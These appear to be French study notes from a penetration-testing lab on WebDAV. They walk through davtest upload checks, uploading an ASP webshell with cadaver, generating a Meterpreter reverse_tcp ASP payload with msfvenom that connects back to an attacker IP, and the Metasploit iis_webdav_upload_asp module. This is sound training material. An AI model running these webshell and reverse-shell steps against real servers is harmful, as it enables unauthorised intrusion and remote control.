
# WebDAV

## WebDAV exploit avec davtest/cadaver  

 un scan classique nmap avec option `script=http-enum` permet de voir si un service "WebDAV" est actif.  


 #### davtest
 davtest permet de s'authentifier sur un service WebDAV et de v√©rifier si on peut uploader des fichiers et de quels types, mais aussi les droits (ex√©cut√©s ou lecture uniquement).  
 `davtest -url http://demo.ine.local/webdav` si aucune authentification n'est requise.  
 `davtest -auth bob:password_123321 -url http://demo.ine.local/webdav` si une authentification est requise.  

Voici le r√©sultat de ce que nous pouvons uploader et ex√©cuter avec la commande de dessus :  

![alt text](<Images/Capture d'√©cran 2025-12-06 124009.png>)

### cadaver  
`cadaver  http://demo.ine.local/webdav` permet de se connecter en tant que client au serveurs WebDAV (on doit s'authentifier apr√®s cette commande).  

Une fois connect√©, tu peux utiliser des commandes simples, comme :  
``ls`` ‚Üí voir les fichiers  
``cd`` ‚Üí naviguer dans les dossiers  
``put`` fichier.ext ‚Üí envoyer un fichier (si autoris√©)  
``get fichier.ext`` ‚Üí r√©cup√©rer un fichier  
``delete fichier.ext`` ‚Üí supprimer un fichier (si autoris√©)  
``mkdir nom`` ‚Üí cr√©er un dossier (si autoris√©)  
‚û°Ô∏è Cadaver sert √† manipuler le contenu WebDAV, rien de plus.  

`put /usr/share/webshells/asp/webshell.asp` permet l'upload d'un webshell.  

Une fois la backdoor (webshell install√©e), on peut se reconnecter depuis le site web, s'authentifier sur le serveur WebDAV puis nous lan√ßons le webshell.  

il suffit de taper `dir c:\` pour lister la racine, puis `type flag.txt` pour lire le flag.  

---

## WebDAV exploit avec Metasploit  

### **M√©thode 1** 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.0.7 LPORT=1234 -f asp > shell.asp`  
üîπ ``msfvenom`` Outil de Metasploit qui sert √† g√©n√©rer des charges utiles (payloads).  
üîπ ``-p windows/meterpreter/reverse_tcp`` Indique quel type de payload tu veux g√©n√©rer.  
Ici, un payload qui ouvre une connexion ‚Äúreverse‚Äù vers une machine distante.  
üîπ ``LHOST=10.1.0.7 et LPORT=1234`` Param√®tres r√©seau qui indiquent o√π la cible doit se connecter si le payload est ex√©cut√©.  
üîπ ``-f asp`` Indique le format du fichier g√©n√©r√© (ASP dans ce cas).  
üîπ ``> shell.asp`` Redirection vers un fichier.  


``put /root/shell.asp``  permet de charger le shell.asp sur le serveur WebDAV.  

D√©marrer Metasploit, puis :  
``use multi/handler`` C'est un module listener. Son r√¥le est d'attendre qu'un payload se connecte √† lui apr√®s avoir √©t√© ex√©cut√© sur une machine cible.  
`set windows/meterpreter/reverse_tcp` (Il faut choisir le m√™me payload que celui que la victime ex√©cutera.)  
Il faut ensuite configurer l'IP machine d'attaque et son port d'√©coute.  
``set LHOST`` 10.1.0.7  
``set LPORT`` 1234  
Puis `run`. Une fois lanc√©, le handler attend qu‚Äôune session se connecte.
Quand la victime ex√©cute le payload, tu obtiens une session Meterpreter ou un shell selon le payload choisi.  

---

### **M√©thode 2**  

La m√©thode scan avec le script `script=http-enum` reste importante, puis la commande avec `davtest` reste la m√™me √©galement pour permettre d'identifier les droits sur le serveur WebDAV.  
√©tape suivante avec Metasploit pour charger un WebShell.  
* D√©marrer Metasploit
* `use exploit/windows/iis/iis_webdav_upload_asp` lancer le module d'exploit.   
* `set RHOSTS demo.ine.local` isentifier cible.  
* `set HttpUsername bob`  
* `set HttpPassword password_123321` rentrer les credentials  
* `set PATH /webdav/metasploit%RAND%.asp` chemin de la cible pour tenter de charger le module   
* `exploit` pour lancer l'exploit  
Ici nous devons obtenir un "meterpreter"  
* `shell` nous permet de lancer le shell Windows. Puis noux pouvons continuer en powershell.  




